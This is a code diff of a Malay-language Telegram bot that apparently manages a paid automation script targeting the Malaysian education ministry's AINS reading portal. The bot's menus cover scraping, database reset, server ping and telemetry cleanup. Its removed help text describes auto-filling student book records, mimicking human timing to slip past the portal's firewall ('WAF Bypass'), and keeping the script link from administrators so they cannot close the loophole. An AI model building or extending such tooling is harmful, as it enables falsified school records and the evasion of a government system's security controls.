-            f"👥 <b>Jumlah Pengguna Bot:</b> {total_users}\n"
-            f"💎 <b>Pengguna PRO:</b> {pro_users}\n"
-            f"🆓 <b>Pengguna FREE:</b> {total_users - pro_users}"
-            "</blockquote>\n\n"
-            "<i>Sistem langganan (SaaS) sedang aktif dan beroperasi cemerlang.</i>"
-        )
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+import threading
 
-    elif call.data == "cmd_fetch":
-        bot.answer_callback_query(call.id, "Scraping buku dari perpustakaan...")
-        subprocess.Popen(["python3", "/root/NilamAutomationTools/fetch_books3.py"])
-        text = (
-            "<b>🔄 PENGUMPULAN DATA API (OPENLIBRARY)</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<blockquote>Jentera <b>Web Scraper</b> telah dilancarkan di latar belakang. Ia sedang menarik beribu-ribu metadata buku baharu dari pangkalan data antarabangsa (OpenLibrary).</blockquote>\n\n"
-            "<i>Tindakan ini adalah selamat dan tidak mengganggu operasi pengguna (Live) yang sedang menjalankan skrip. Sila semak semula Dashboard selepas beberapa minit.</i>"
-        )
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_db"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_reset_confirm":
-        text = (
-            "<b>⚠️ PENGESAHAN RESET DATABASE</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<blockquote><b>AMARAN KRITIKAL!</b> Anda sedang cuba memadam <b>KESELURUHAN</b> rekod memori awan (Cloud Memory) dari pelayan Supabase.</blockquote>\n\n"
-            "Tindakan ini <b>TIDAK BOLEH DIUNDURKAN</b>. Skrip akan mula mengekstrak buku dari nombor indeks sifar (0) untuk semua pengguna. Ini berisiko tinggi menyebabkan ralat <i>Duplicate Entry</i> secara besar-besaran jika akaun pelajar yang sama masih digunakan pada portal.\n\n"
-            "Sila buat pilihan pengesahan yang teliti:"
-        )
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("❌ BATALKAN OPERASI", callback_data="menu_db"),
-            InlineKeyboardButton("🚨 YA, FORMAT SEKARANG", callback_data="cmd_reset_execute")
-        )
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_reset_execute":
-        bot.answer_callback_query(call.id, "Memformat data awan...")
+def background_gc_worker():
+    # BACKEND/AUTOMATION: Garbage Collection & Analytics Thread
+    while True:
         try:
-            req = urllib.request.Request(f"{SUPA_URL}?title=not.eq.random_string", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
-            urllib.request.urlopen(req)
-            text = (
-                "<b>✅ DATABASE BERJAYA DIFORMAT</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "<blockquote>Supabase Cloud Memory kini 100% bersih. Kesemua isyarat telemetri dan memori log buku telah dikosongkan. Sistem sedia beroperasi kembali.</blockquote>"
-            )
-        except Exception as e:
-            text = (
-                "<b>❌ RALAT PENGHAPUSAN</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "<blockquote>Sistem gagal memformat pangkalan data. Ralat dipulangkan:\n"
-                f"<code>{str(e)}</code></blockquote>"
-            )
-        
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke Pangkalan Data", callback_data="menu_db"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_ping":
-        bot.answer_callback_query(call.id, "Menghantar paket ICMP...")
-        try:
-            start = time.time()
-            res = urllib.request.urlopen("https://ains-api.moe.gov.my", timeout=5)
-            ms = int((time.time() - start) * 1000)
-            status = "🟢 ONLINE & STABIL" if res.status == 200 else f"🟡 HTTP {res.status}"
-        except urllib.error.HTTPError as e:
-            ms = int((time.time() - start) * 1000)
-            if e.code in [401, 403, 404, 405, 429]: status = f"🟢 ONLINE (API Response: {e.code})"
-            else: status = f"🔴 ERROR (HTTP {e.code})"
-        except Exception as e:
-            ms = "N/A"
-            status = "🔴 OFFLINE / TIMEOUT"
-
-        uptime_seconds = int(time.time() - START_TIME)
-        uptime_str = str(datetime.timedelta(seconds=uptime_seconds))
-
-        text = (
-            "<b>🖥️ DIAGNOSTIK KESIHATAN SISTEM</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<b>📡 PELAYAN AINS (MOE):</b>\n"
-            "<blockquote>"
-            f"<b>Status:</b> {status}\n"
-            f"<b>Latensi Rangkaian:</b> <code>{ms} ms</code>\n"
-            "<b>WAF Firewall:</b> Aktif (Rate Limiting dikesan)\n"
-            "<b>Protokol Penyulitan:</b> TLS 1.3 Disahkan"
-            "</blockquote>\n\n"
-            "<b>🤖 ENJIN COMMAND CENTER:</b>\n"
-            "<blockquote>"
-            f"<b>Masa Beroperasi (Uptime):</b> <code>{uptime_str}</code>\n"
-            "<b>Senibina Aplikasi:</b> Python 3 / pyTelegramBotAPI\n"
-            "<b>Pangkalan Data Awan:</b> Supabase REST (Tersambung)"
-            "</blockquote>"
-            f"{get_upsell_text(plan)}"
-        )
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔄 Uji Semula (Ping)", callback_data="cmd_ping"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_system"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_help":
-        text = (
-            "<b>❓ PANDUAN PUSAT KAWALAN PRO</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<b>Info Sistem (v15.0)</b>\n"
-            "<blockquote>Skrip automasi ini dibina secara khusus untuk mengemudi dan mengatasi halangan pada portal AINS. Ia mengautomasikan pengisian data buku, meniru rentak kelakuan manusia (Jitter), dan menipu sistem sekatan pelayan (WAF Bypass).</blockquote>\n\n"
-            "<b>Teknologi Telemetri Masa Nyata</b>\n"
-            "<blockquote>Apabila seseorang pengguna memasukkan kod di pelayar web, skrip akan mewujudkan satu 'jambatan rahsia' yang memancarkan laporan terus ke Supabase. Bot Telegram ini bertindak memintas isyarat tersebut dan menterjemahkannya kepada paparan Live Users dan Metrik.</blockquote>\n\n"
-            "<b>Amaran Keselamatan</b>\n"
-            "<blockquote><b>SANGAT PENTING:</b> Dilarang sama sekali menyebarkan pautan CDN skrip anda kepada awam. Ini bagi mengelakkan pihak pentadbir AINS memuat turun skrip, menganalisis struktur 'Bypass' kita, dan menutup kelompongan sistem mereka buat selamanya.</blockquote>"
-            f"{get_upsell_text(plan)}"
-        )
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+            now = int(time.time() * 1000)
+            threshold = now - (15 * 60 * 1000) # 15 minutes
+            q = urllib.parse.quote('ilike.__TEL__|*')
+            req = urllib.request.Request(f"{SUPA_URL}?title={q}", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
+            with urllib.request.urlopen(req) as res:
+                data = json.loads(res.read().decode('utf-8'))
+                for r in data:
+                    ts = int(r['title'].split('|')[2])
+                    if ts < threshold:
+                        # Auto purge old telemetry to optimize DB scaling
+                        del_q = urllib.parse.quote(r['title'])
+                        del_req = urllib.request.Request(f"{SUPA_URL}?title=eq.{del_q}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
+                        urllib.request.urlopen(del_req)
+        except: pass
+        time.sleep(300)
 
 if __name__ == "__main__":
-    print("Bot Command Center v15.0 sedang berjalan...")
+    print("NILAM COMMAND CENTER v17.0 (MAX SECURITY) ONLINE.")
+    threading.Thread(target=background_gc_worker, daemon=True).start()
     bot.polling(none_stop=True, timeout=60)
